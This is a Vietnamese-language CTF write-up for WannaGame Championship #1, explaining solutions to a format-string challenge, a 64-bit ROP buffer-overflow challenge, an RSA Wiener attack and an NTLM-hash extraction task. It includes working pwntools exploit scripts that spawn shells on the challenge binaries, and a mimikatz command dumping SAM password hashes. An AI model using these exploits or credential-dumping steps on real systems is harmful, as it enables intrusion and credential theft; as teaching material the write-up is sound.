# Writeups WannaGame Championship #1

@boodamdang

##############################

- [Start pwn](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/README.md#start-pwn)
- [It is simple, but not easy](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/README.md#it-is-simple-but-not-easy)
- [RSA 1](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/README.md#rsa-1)
- [Extract password from registry files](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/README.md#extract-password-from-registry-files)

##############################

## Start pwn

File(s): [fms](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/fms).

fms là gì nhỉ... feel my style? :D. Đầu tiên, chúng ta chạy thử file:

```
kali@kali:~/Desktop/WGC August 2020$ ./fms
Is any body here? (yes or no)
no
Sad !!
kali@kali:~/Desktop/WGC August 2020$ ./fms
Is any body here? (yes or no)
yes
This isn't enough.
kali@kali:~/Desktop/WGC August 2020$ ./fms
Is any body here? (yes or no)
Co Hien xinh dep
Co Hien xinh dep
This isn't enough.
```

Có 3 trường hợp như trên. Chúng ta mở file bằng IDA Pro và xem mã giả của hàm `main`:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+0h] [bp-48h]@1

  puts("Is any body here? (yes or no)");
  fflush(stdout);
  fgets(&s, 64, stdin);
  if ( strstr(&s, "no") )
  {
    printf("Sad !!");
    exit(1);
  }
  if ( !strstr(&s, "yes") )
  {
    printf(&s);
    fflush(stdout);
  }
  check_key();
  return 0;
}
```

Chương trình cho phép chúng ta nhập vào input dài tối đa `64` ký tự. Trường hợp input không chứa `no` và `yes` thì chương trình in ra input của chúng ta vừa nhập vào. Điều đáng chú ý ở đây là lệnh `printf(&s);` thiếu tham số format string (viết tắt là fms như tên file). Lỗ hổng format string là như thế nào, chúng ta có thể khai thác gì từ nó, cách khai thác như thế nào - xem ở [video 1](https://www.youtube.com/watch?v=0WvrSfcdq1I) và [video 2](https://www.youtube.com/watch?v=t1LH9D5cuK4) (video khá ngắn gọn và dễ hiểu, chỉ cần xem bằng cả con tim là được, mình thì hơi ngu nên xem tầm chục lần mới hiểu rõ).

Sau khi in ra input chúng ta nhập vào. Chương trình gọi hàm `check_key`:

```
int check_key()
{
  int result; // eax@2

  if ( key_number == 2020 )
  {
    printf("Good");
    result = cat_flag();
  }
  else
  {
    result = printf("This isn't enough.");
  }
  return result;
}
```

Hàm này kiểm tra nếu giá trị biến toàn cục `key_number` bằng `2020` thì trả về hàm `cat_flag`:

```
int cat_flag()
{
  return system("/bin/sh");
}
```

Vậy việc chúng ta cần làm là lợi dụng lỗ hổng format string để gán giá trị `key_number` bằng `2020`.

Hàm `printf` ngoài chức năng in thì nó còn có thể gán giá trị một biến bằng một số nào đó sử dụng format string `%n`. Ví dụ lệnh `printf("damdang%n", &boo);` dùng để gán giá trị biến `boo` bằng `7` - chính là số ký tự trước `%n`.

Bây giờ chúng ta cần tìm địa chỉ của biến `key_number`:

```
pwndbg> i var
All defined variables:

Non-debugging symbols:
0x08048718  _fp_hw
0x0804871c  _IO_stdin_used
0x0804876c  __GNU_EH_FRAME_HDR
0x080488b0  __FRAME_END__
0x08049f08  __frame_dummy_init_array_entry
0x08049f08  __init_array_start
0x08049f0c  __do_global_dtors_aux_fini_array_entry
0x08049f0c  __init_array_end
0x08049f10  __JCR_END__
0x08049f10  __JCR_LIST__
0x08049f14  _DYNAMIC
0x0804a000  _GLOBAL_OFFSET_TABLE_
0x0804a02c  __data_start
0x0804a02c  data_start
0x0804a030  __dso_handle
0x0804a034  __TMC_END__
0x0804a034  __bss_start
0x0804a034  _edata
0x0804a040  stdin
0x0804a040  stdin@@GLIBC_2.0
0x0804a044  stdout
0x0804a044  stdout@@GLIBC_2.0
0x0804a048  completed
0x0804a04c  key_number
0x0804a050  _end
```

Vậy địa chỉ của `key_number` là `0x0804a04c`.

Chúng ta thử đặt breakpoint và dùng gdb debug xem giá trị của biến `key_number` lúc so sánh với `2020` là bao nhiêu:

```
pwndbg> disass check_key
Dump of assembler code for function check_key:
   0x08048594 <+0>:     push   ebp
   0x08048595 <+1>:     mov    ebp,esp
   0x08048597 <+3>:     sub    esp,0x8
   0x0804859a <+6>:     mov    eax,ds:0x804a04c
   0x0804859f <+11>:    cmp    eax,0x7e4
   0x080485a4 <+16>:    je     0x80485b8 <check_key+36>
   0x080485a6 <+18>:    sub    esp,0xc
   0x080485a9 <+21>:    push   0x8048728
   0x080485ae <+26>:    call   0x8048400 <printf@plt>
   0x080485b3 <+31>:    add    esp,0x10
   0x080485b6 <+34>:    jmp    0x80485cd <check_key+57>
   0x080485b8 <+36>:    sub    esp,0xc
   0x080485bb <+39>:    push   0x804873b
   0x080485c0 <+44>:    call   0x8048400 <printf@plt>
   0x080485c5 <+49>:    add    esp,0x10
   0x080485c8 <+52>:    call   0x804857b <cat_flag>
   0x080485cd <+57>:    nop
   0x080485ce <+58>:    leave  
   0x080485cf <+59>:    ret    
End of assembler dump.
pwndbg> break *0x0804859f
Breakpoint 1 at 0x804859f
pwndbg> run
Starting program: /home/kali/Desktop/WGC August 2020/fms 
Is any body here? (yes or no)
boodamdang
boodamdang

Breakpoint 1, 0x0804859f in check_key ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0x6c0
 EDX  0x804b1a0 ◂— 'boodamdang\n here? (yes or no)\n'
 EDI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
 ESI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
 EBP  0xffffd2a8 —▸ 0xffffd2f8 ◂— 0x0
 ESP  0xffffd2a0 —▸ 0xf7fb1d20 (_IO_2_1_stdout_) ◂— test   byte ptr [edx], ch /* 0xfbad2a84 */
 EIP  0x804859f (check_key+11) ◂— cmp    eax, 0x7e4
```

Có thể thấy giá trị tại địa chỉ `0x0804a04c` (chính là `key_number`) được lưu vào thanh ghi `eax` và có giá trị là `0`. Chúng ta sẽ tìm cách gán `2020` vào địa chỉ này.

Quay lại ví dụ bên trên `printf("damdang%n", &boo);`. Trường hợp này là truyền đủ và đúng tham số, nhưng chúng ta không cần quan tâm tới việc truyền đúng hay sai. Bản chất cách hoạt động của hàm trên là đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới.

Chúng ta thử như sau:

```
kali@kali:~/Desktop/WGC August 2020$ python -c "print 'aaaa' + '%x'*1" | ./fms
Is any body here? (yes or no)
aaaa8048768
This isn't enough.
kali@kali:~/Desktoppython -c "print 'aaaa' + '%x'*2" | ./fms
Is any body here? (yes or no)
aaaa8048768f7f2d580
This isn't enough.
kali@kali:~/Desktop/WGC August 2020$ python -c "print 'aaaa' + '%x'*3" | ./fms
Is any body here? (yes or no)
aaaa8048768f7f10580f7f0ea80
This isn't enough.
kali@kali:~/Desktop/WGC August 2020$ python -c "print 'aaaa' + '%x'*4" | ./fms
Is any body here? (yes or no)
aaaa8048768f7fa5580f7fa3a8061616161
This isn't enough.
```

Ở case cuối, `61616161` được in ra - có nghĩa là `%x` thứ 4 trỏ tới vị trí lưu chuỗi `aaaa` chúng ta truyền vào. Vậy bây giờ chúng ta sẽ thay `aaaa` bằng `\x4c\xa0\x04\x08` (Little Endian), thay `%x` thứ 4 bằng `%n` và dùng gdb để debug xem giá trị tại địa chỉ `0x0804a04c` có được gán bằng giá trị khác 0 hay không:

```
pwndbg> run <<< $(python -c "print '\x4c\xa0\x04\x08' + '%x'*3 + '%n'")
Starting program: /home/kali/Desktop/WGC August 2020/fms <<< $(python -c "print '\x4c\xa0\x04\x08' + '%x'*3 + '%n'")    
Is any body here? (yes or no)                                                                                           
L8048768f7fb1580f7fafa80

Breakpoint 1, 0x0804859f in check_key ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
 EAX  0x1b
 EBX  0x0
 ECX  0x6c0
 EDX  0x804b1a0 —▸ 0x804a04c (key_number) ◂— 0x1b
 EDI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
 ESI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
 EBP  0xffffd2a8 —▸ 0xffffd2f8 ◂— 0x0
 ESP  0xffffd2a0 —▸ 0xf7fb1d20 (_IO_2_1_stdout_) ◂— test   byte ptr [edx], ch /* 0xfbad2a84 */
 EIP  0x804859f (check_key+11) ◂— cmp    eax, 0x7e4
```

Thanh ghi `eax` lưu giá trị `0x1b` - có nghĩa là chúng ta đã gán giá trị cho `key_number` thành công.

Như đã nói ở trên, hàm `printf` đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới, mà giá trị chúng ta muốn gán là `2020` - có nghĩa trước `%n` phải có `2020` ký tự, trong khi độ dài input tối đa mà chương trình cho chúng ta nhập là `64`.

Để giả quyết vấn đề độ dài input không đủ lớn, chúng ta sử dụng ký hiệu `$`, cú pháp như sau: `%X$Y<fms>`. `<fms>` sẽ trỏ tới vị trí `X`, output ra màn hình có độ dài là `Y`. Áp dụng vào challenge này, ta có input như sau:

- Địa chỉ `0x0804a04c`.
- Fomat string `%x`:
  - Chỗ này X = 1, 2, 3, 4, ... gì cũng được, bởi vì mục đích chính ở đây là in ra `2020` ký tự trước `%n` chứ không quan tâm format string này trỏ tới đâu. Thôi thì lấy `X = 4` bởi vì c____ h__ m___ 4 t___ (chuyện thầm kín :v).
  - Chúng ta cần `2020` ký tự trước `%n` --> 2020 - 4 (4 byte của địa chỉ) = `2016 = Y`.
- Fomat string `%n`:
  - Chỗ này thì bắt buộc `X = 4` để format string trỏ tới địa chỉ `0x0804a04c` (tại sao là `4` thì đã giải thích ở chỗ thử `aaaa` bên trên).
  - `Y` thì không cần thiết nên chúng ta có thể bỏ qua.

Vậy cuối cùng chúng ta có đoạn code exploit như sau:

```
from pwn import *

key_address = 0x804a04c

p = p32(key_address)
p += '%4$2016x'
p += '%4$n'

proc = process('./fms')
proc.sendlineafter('here?', p)
proc.interactive()
proc.close()
```

Runnnnnnnnnnn:

```
kali@kali:~/Desktop/WGC August 2020$ python fms_exploit.py
[+] Starting local process './fms': pid 43923
[*] Switching to interactive mode
 (yes or no)
L\xa0\x04                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         804a04c
$ ls
core  fms_exploit.py                RSHack        slc
flag  nothing_or_everything.png            rtl            slc_exploit.py
fms   _nothing_or_everything.png.extracted  rtl_exploit.py
$ cat flag
flag{--- --- --- --- boodamdang --- --- --- ---}
$ exit
Good[*] Process './fms' stopped with exit code 0 (pid 43923)
[*] Got EOF while reading in interactive
```

## It is simple, but not easy

File(s): [slc](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/slc).

Mình mò bài pwn cuối cả ngày trời không ra, ngó qua bài này 30' là ra :(. Đúng là đôi khi chúng ta hay chạy theo những điều hảo huyền mà bỏ quên hạnh phúc ngay bên cạnh :(.

slc là gì nhỉ... sound like cat? mèo méo meo? :D. Đầu tiên, chúng ta chạy thử file:

```
kali@kali:~/Desktop/WGC August 2020$ ./slc
How are you today? 
>fineeee 
The server created a number, let guess it.
Guess the number: 
>4
Bad!Number is: 1804289383kali
@kali:~/Desktop/WGC August 2020$ ./slc
How are you today? 
>fineeee 
The server created a number, let guess it.
Guess the number: 
>1804289383
Good
```

Chẳng hiểu gì :v. Mình thử ném file vào IDA Pro lại càng không hiểu gì do quá nhiều hàm con.

Chúng ta hãy thử làm crash chương trình:

```
kali@kali:~/Desktop/WGC August 2020$ python -c "print 'Co Hien xinh dep'*100" | ./slc
How are you today? 
>The server created a number, let guess it.
Guess the number: 
>Segmentation fault
```

Chương trình bị rụng rời trước sự xinh đẹp của cô Hiền nên crash thật rồi nè :(. Có nghĩa là có lỗi Buffer Overflow làm ghi đè địa chỉ trả về.

Chúng ta dùng `checksec` để kiểm tra mitigation của file:

```
kali@kali:~/Desktop/WGC August 2020$ checksec --file=slc
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No      0               0       slc
```

`No canary found` - chúng ta có thể ghi đè địa chỉ trả về, `NX enabled` - chúng ta không thể thực thi shellcode mà chúng ta nhập vào - cần phải return về code của chương trình.

Ở đây mình sẽ áp dụng kỹ thuật `ROP`. Kỹ thuật ROP là gì, cơ chế hoạt động như thế nào, khai thác như thế nào, ... Trong quá trình học môn Cơ chế hoạt động của mã độc, mình đã có một bài viết về ROP tại [đây](https://github.com/thuatuit001/ROP-Explanation).

Mình đã trình bày khá đầy đủ ở bài viết đó, nên ở đây mình không giải thích lại. Chúng ta dùng thuật toán tìm kiếm nhị phân chạy bằng cơm để mò ra số ký tự padding, đoạn code exploit như sau:

```
from pwn import *
from struct import pack

proc = process('./slc')

p = 'Co_Hien_xinh_dep_sieu_cap_vu_tru_<3'*8
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb080) # @ .data
p += pack('<Q', 0x000000000041fd64) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000474d71) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x00000000004269bf) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474d71) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016b6) # pop rdi ; ret
p += pack('<Q', 0x00000000006cb080) # @ .data
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x00000000004431f6) # pop rdx ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x00000000004269bf) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004003da) # syscall

proc.sendlineafter('>', p)
proc.sendlineafter('>', '1804289383')
proc.interactive()
proc.close()
```

Runnnnnnnnnnn:

```
kali@kali:~/Desktop/WGC August 2020$ python slc_exploit.py
[+] Starting local process './slc': pid 44327
[*] Switching to interactive mode
$ ls
RSHack                      fms             rtl_exploit.py
_nothing_or_everything.png.extracted  fms_exploit.py         slc
core                      nothing_or_everything.png  slc_exploit.py
flag                      rtl
$ cat flag
flag{--- --- --- --- boodamdang --- --- --- ---}
$ exit
[*] Got EOF while reading in interactive
```

## RSA 1

File(s): [chall1.py](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/chall1.py).

Bài này `e` rất lớn, chúng ta dùng `Wiener Attack`. Mình thì dốt toán nên mình dùng tool [RSHack](https://github.com/zweisamkeit/RSHack) thôi chứ mình cũng không biết Wiener Attack ra ngô ra khoai như thế nào nữa:

```
kali@kali:~/Desktop/WGC August 2020/RSHack$ python3 rshack.py

                #########################
                #      RSHack v2.1      #
                #      Zweisamkeit      #
                #      GNU GPL v3       #
                #########################



        List of the available attacks:

                1. Wiener Attack
                2. Hastad Attack
                3. Fermat Attack
                4. Bleichenbacher Attack
                5. Common Modulus Attack
                6. Chosen Plaintext Attack

        List of the available tools:

                a. RSA Public Key parameters extraction
                b. RSA Private Key parameters extraction
                c. RSA Private Key construction (PEM)
                d. RSA Public Key construction (PEM)
                e. RSA Ciphertext Decipher
                f. RSA Ciphertext Encipher

        [*] What attack or tool do you want to carry out? 1

                         ***** Wiener Attack *****

                [*] Arguments ([-h] -n modulus -e exponent):

                        -n 19046128460580268124792418904439923628038380443228614265420753892208104167384699017880677209377989395759591201697416049286383805170787541508371508515718955340575523473825891740622486639297040981969651065677948514952134974296831008272261057223021343503211206743996697527180249217592723774774930021834627406433820336641830463392360823794688570988028821653274089530814733340477181869238461145402905191920439212888877192355189110608852253758670096831911199834500447101981710674975983733271018776412384571799375887748182868741531950257181923159967822037157631376933663317909176616732352195034753153046658158087075518071743 -e 1572840401382569468846775838644864959820115464786082316205435501177464948896069977695576806151197942229295150118114329746275714634820239013512151181115838659843753236933751862822424246721512061620016115677332253038805317760297772593740667594440874673286411343455273269682959068299741244773950134363299303660437085638394927153304076489961105440193163696356770760898601459132669139268972614341313240819408991186498196955179787046690090111362440331326174662388864160477869133489143888243688568445847955557539131936453113752964986841705559145850625843267633705056895653900187431664871087050122151130232099694959966146559


        ~~~~~~~~~~~~~~~~~~~~~~~~~
              Wiener Attack      
               Zweisamkeit       
            GNU GPL v3 License   
        ~~~~~~~~~~~~~~~~~~~~~~~~~


        [+] Private exponent: 16656927799163353877661715681598773131450887062970807023117168014424259242616105753626484669505496415330904982249092231332127999

```

Đã tìm được `d`, chúng ta chỉ việc ném vào công thức decrypt thôi:

```
Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 22:45:29) [MSC v.1916 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> c = 15117416048092133274557453853729887542200128328930534843021285730677276284270477622962058237808271356979450355418169232998967691981790282765192908642906639324432221017652654762693485091329051679364260361174886319562081628266590632455952772363206926190304116699657083860035021588113707382388882159043027411833624002939539168362346246453538337138614831397000142189340100059828194454794077279541548254328526191696750603083765773127528621356185183354118653213851144253203085401947486214639332849181929418583213278367646150546527984088057117740497924375431316139015999312203952904522317319776590085425670641209493844015554
>>> d = 16656927799163353877661715681598773131450887062970807023117168014424259242616105753626484669505496415330904982249092231332127999
>>> n = 19046128460580268124792418904439923628038380443228614265420753892208104167384699017880677209377989395759591201697416049286383805170787541508371508515718955340575523473825891740622486639297040981969651065677948514952134974296831008272261057223021343503211206743996697527180249217592723774774930021834627406433820336641830463392360823794688570988028821653274089530814733340477181869238461145402905191920439212888877192355189110608852253758670096831911199834500447101981710674975983733271018776412384571799375887748182868741531950257181923159967822037157631376933663317909176616732352195034753153046658158087075518071743
>>> bytes.fromhex(hex(pow(c, d, n))[2:]).decode('utf-8')
'wannagame{5a378bac7eb090bb86a5ce0042ce6542c0dd346f}'
```

## Extract password from registry files

File(s): [sa](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/sa), [sy](https://github.com/thuatuit001/Writeups-WannaGameChampionship-1/blob/master/sy).

Sau một hồi tìm hiểu thì mình biết 2 file registry này là SAM (Security Account Manager) và SYSTEM.

Sau một hồi tìm hiểu nữa thì mình tìm được [video](https://www.youtube.com/watch?v=jEMW9vYG62Y) hướng dẫn dump password từ 2 file này. Mình làm theo và được kết quả như sau:

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  9 2020 22:45:17
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::sam /system:C:\Users\boo\Desktop\sy /SAM:C:\Users\boo\Desktop\sa
Domain : JOHN-PC
SysKey : 97fd831aaa54840800ead7b16fc2413e
Local SID : S-1-5-21-806928618-3257427745-877340488

SAMKey : 1edbf838753ddf7adae5440d5a6ff2b1

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : JOHN
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

```

Ném `Hash NTLM` của John lên [CrackStation](https://crackstation.net/), được kết quả là chuỗi rỗng. Lấy `sha1` của chuỗi rỗng ta được:

```
boo@DESKTOP-GGURATD:~$ echo -n '' | sha1sum
da39a3ee5e6b4b0d3255bfef95601890afd80709  -
```

Flag: `wannagame{da39a3ee5e6b4b0d3255bfef95601890afd80709}`
